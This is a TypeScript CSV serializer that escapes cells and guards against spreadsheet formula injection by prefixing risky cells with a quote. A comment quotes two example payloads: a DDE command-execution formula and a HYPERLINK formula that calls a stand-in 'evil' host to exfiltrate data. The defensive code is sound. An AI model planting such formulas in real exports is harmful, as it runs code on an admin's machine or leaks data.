// Tiny CSV serializer. Quotes fields that contain comma, quote, newline,
// or carriage return; doubles inner quotes per RFC 4180. UTF-8 BOM is
// prepended so Excel opens Turkish characters correctly.

const BOM = "﻿";

// CSV formula injection guard: Excel / LibreOffice / Google Sheets treat
// cells that start with `=`, `+`, `-`, `@`, `\t`, or `\r` as formulas.
// An attacker who controls a free-text field (customer name, order notes,
// guest phone) could craft `=cmd|'/c calc'!A1` or
// `=HYPERLINK("http://evil…",x)` to run code or exfiltrate data when an
// admin opens the export. Prefix the cell with a single quote to defang
// the formula prefix without breaking the visible value.
const DANGEROUS_PREFIX_RE = /^[=+\-@\t\r]/;

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let str = String(value);
  if (DANGEROUS_PREFIX_RE.test(str)) {
    str = `'${str}`;
  }
  const needsQuoting = /[",\r\n]/.test(str);
  if (!needsQuoting) return str;
  return `"${str.replace(/"/g, '""')}"`;
}

export function toCsv(
  rows: Record<string, unknown>[],
  columns: { key: string; header: string }[],
): string {
  const header = columns.map((c) => escapeCell(c.header)).join(",");
  const body = rows
    .map((row) =>
      columns.map((c) => escapeCell(row[c.key])).join(","),
    )
    .join("\n");
  return BOM + header + "\n" + body + "\n";
}
